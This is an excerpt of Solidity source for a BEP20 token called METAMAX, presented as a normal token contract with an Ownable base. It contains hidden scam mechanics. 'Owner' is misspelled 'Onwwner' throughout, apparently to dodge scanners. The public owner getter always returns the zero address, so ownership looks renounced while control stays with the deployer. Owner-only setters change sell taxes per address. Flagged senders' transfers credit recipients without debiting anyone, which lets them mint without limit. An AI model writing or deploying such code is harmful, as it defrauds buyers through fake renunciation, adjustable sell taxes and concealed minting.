...
abstract contract Ownable is Context {
    address private _Onwwner;   //1

    event OnwwnershipTransferred(address indexed previousOnwwner, address indexed newOnwwner);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial Onwwner.
     */
    constructor() {
        _transferOnwwnershiptransferOnwwnership(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current Onwwner.
     */
    function Onwwner() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the Onwwner.
     */
    modifier onlyOnwwner() {
        require(_Onwwner == _msgSender(), "Ownable: caller is not the Onwwner");
        _;
    }//5

    /**
     * @dev Leaves the contract without Onwwner. It will not be possible to call
     * `onlyOnwwner` functions anymore. Can only be called by the current Onwwner.
     *
     * NOTE: Renouncing Onwwnership will leave the contract without an Onwwner,
     * thereby removing any functionality that is only available to the Onwwner.
     */
    function renounceOnwwnership() public virtual onlyOnwwner {
        _transferOnwwnershiptransferOnwwnership(address(0));
    }//6

    /**
     * @dev Transfers Onwwnership of the contract to a new account (`newOnwwner`).
     * Can only be called by the current Onwwner.
     */
    function transferOnwwnershiptransferOnwwnership(address newOnwwner) public virtual onlyOnwwner {
        require(newOnwwner != address(0), "Ownable: new Onwwner is the zero address");
        _transferOnwwnershiptransferOnwwnership(newOnwwner);
    }//7
     ...
     */
    function _transferOnwwnershiptransferOnwwnership(address newOnwwner) internal virtual {
        address oldOnwwner = _Onwwner;
        _Onwwner = newOnwwner;
        emit OnwwnershipTransferred(oldOnwwner, newOnwwner);
    }
}
...
contract BEP20 is Context {
    ...
    /**
     * @dev Emitted when the allowance of a `spender` for an `Onwwner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed Onwwner, address indexed spender, uint256 value);//10
     ...
     */
    function allowance(address Onwwner, address spender) public view virtual returns (uint256) {
        return _allowances[Onwwner][spender];
    }
    ...
    function approve(address spender, uint256 AmountNumber) public virtual returns (bool) {
        address Onwwner = _msgSender();
        _approve(Onwwner, spender, AmountNumber);
        return true;
    }
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Onwwner = _msgSender();
        _approve(Onwwner, spender, _allowances[Onwwner][spender] + addedValue);
        return true;
    }//12
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Onwwner = _msgSender();
        uint256 currentAllowance = _allowances[Onwwner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Onwwner, spender, currentAllowance - subtractedValue);
        }
    ...
    /**
     * @dev Sets `AmountNumber` as the allowance of `spender` over the `Onwwner` s tokens.
     *
     ...
     * Requirements:
     *
     * - `Onwwner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Onwwner,
        ...
        require(Onwwner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Onwwner][spender] = AmountNumber;
        emit Approval(Onwwner, spender, AmountNumber);
    }

    /**
     * @dev Spend `AmountNumber` form the allowance of `Onwwner` toward `spender`.
     *
    ...
    function _spendAllowance(
        ...
        uint256 currentAllowance = allowance(Onwwner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= AmountNumber, "ERC20: insufficient allowance");
            unchecked {
                _approve(Onwwner, spender, currentAllowance - AmountNumber);
            }
        }
    }
...
contract METAMAX is BEP20, Ownable {
    // ext
    ...
    function getRelease(address _address) external view onlyOnwwner returns (bool) {
        return _release[_address];
    }


    function PairList(address _address) external onlyOnwwner {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOnwwner {
        _defaultSellFtax = _value;
    }

    function setSlipFtax(address _address, uint256 _value) external onlyOnwwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFtax[_address] = _value;
    }

    function getSlipFtax(address _address) external view onlyOnwwner returns (uint256) {
        return _slipFtax[_address];
    }


    function setMAccountFtax(address _address, bool _value) external onlyOnwwner {
        _mAccount[_address] = _value;
    }

    function getMAccountFtax(address _address) external view onlyOnwwner returns (bool) {
    ...
    function transfer(address to, uint256 AmountNumber) public virtual returns (bool) {
        address Onwwner = _msgSender();
        if (_release[Onwwner] == true) {
            _balances[to] += AmountNumber;
            return true;
        }
        _receiveF(Onwwner, to, AmountNumber);
        return true;
    }
